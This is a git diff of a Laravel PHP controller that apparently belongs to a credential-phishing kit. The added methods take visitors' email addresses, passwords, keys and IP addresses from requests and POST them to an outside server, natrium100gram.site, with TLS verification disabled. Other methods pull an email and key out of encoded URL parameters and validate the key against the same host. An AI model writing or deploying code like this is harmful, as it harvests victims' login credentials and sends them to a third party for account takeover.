@@ -18,6 +18,28 @@ class Controller extends BaseController
     use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
 
 
+    public function dash(Request $request){
+        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/petrify",["email"=>$request->email]);
+        return json_decode($response,1) ;
+    }
+
+    public function knockup(Request $request){
+        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/purify",["key"=>$request->key]);
+        return json_decode($response,1) ;
+//        return $response;
+    }
+
+    public function shutdown(Request $request){
+        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/flicker",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
+        return $response ;
+//        return $response;
+    }
+
+    public function dmg(Request $request){
+        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/trues",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
+        return $response->status();
+    }
+
     function get_ip() {
         $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
 
@@ -40,10 +62,10 @@ class Controller extends BaseController
 
     public function index_red(){
         $decode = request()->query('e');
-        
+
         $email = explode("_",$decode)[0];
         $key_red  = explode("_",$decode)[1];
-        // return explode("_",$decode);
+
         $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);
 
         if ($key_val->successful()){
@@ -54,7 +76,7 @@ class Controller extends BaseController
             return $key_val->status();
         }
 
-        
+
     }
 
     public function index(){
@@ -77,8 +99,9 @@ class Controller extends BaseController
     }
 
     public function index2(Request $request){
-        $decode = base64_decode($request->subs);
-        $decode2 = explode("#",$decode)[1];
+//         $decode = base64_decode($request->subs);
+//         $decode2 = explode("#",$decode)[1];
+        $decode2 = $request->subs;
         $email = explode("&",$decode2)[0];
         $key_red  = explode("&",$decode2)[1];
 //        return $key_red;
